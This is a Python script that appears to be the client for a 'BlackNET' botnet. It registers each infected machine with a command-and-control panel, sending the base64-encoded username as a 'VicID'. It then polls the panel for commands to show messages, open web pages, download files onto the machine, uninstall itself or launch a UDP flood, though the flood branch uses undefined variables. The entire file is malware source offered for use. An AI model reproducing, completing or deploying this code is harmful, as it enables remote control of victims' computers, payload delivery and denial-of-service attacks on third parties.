import requests
import os
import socket
import struct
import platform
import base64
import time

PanelURL = "http://EnterYourBlackNETPanelHost/blacknet/"
cid = "HacKed"
uid = cid + "_" + base64.b64encode(os.getlogin());
if os.name == "posix":
      oss = "GNU/LINUX"
elif os.name == 'nt':
	 oss = "Microsoft Windows"
else:
	 oss = "MacOS"

requests.get(url = PanelURL + "connection.php", params = {'VicID': uid,'os': oss,'antivirus': "None",'status': "Online"})

count = 0
while (count == 0):
   commands = requests.get(PanelURL + "/getCommand.php?id=" + uid)
   splitcommand = commands.text.split("|BN|")
   time.sleep(10)
   if splitcommand[0] == '':
      print ""
   else:
      if splitcommand[0] == "PrintMessage":
         
              time.sleep(10)
              print splitcommand[1]
              time.sleep(10)
              requests.get(url = PanelURL + "receive.php", params = {'command': "CleanCommands",'VicID': uid})
      else:
         print "";

      if splitcommand[0] == "OpenPage":
                time.sleep(10)
                os.system("firefox " + splitcommand[1])
                time.sleep(10)
                requests.get(url = PanelURL + "receive.php", params = {'command': "CleanCommands",'VicID': uid})
      else:
         print "";

      if splitcommand[0] == "DDOSAttack":
                port = 80;
                while True:
                     sock.sendto(bytes, (ip,port))
                     sent = sent + 1
                     port = port + 1
                     if port == 65534:
                        port = 1
      else:
         print "";
         
      if splitcommand[0] == "UploadFile":
              file_url = splitcommand[1]
              r = requests.get(file_url, stream = True) 
              with open(splitcommand[2],"wb") as pdf: 
                  for chunk in r.iter_content(chunk_size=1024): 
                   if chunk: 
                    pdf.write(chunk) 
                   pass
                  requests.get(url = PanelURL + "receive.php", params = {'command': "CleanCommands",'VicID': uid})
      else:
         print "";

      if splitcommand[0] == "Uninstall":
                  requests.get(url = PanelURL + "receive.php", params = {'command': "Uninstall",'VicID': uid})
                  quit()
      else:
         print "";

      if splitcommand[0] == "Close":
                  quit()
      else:
         print "";
pass
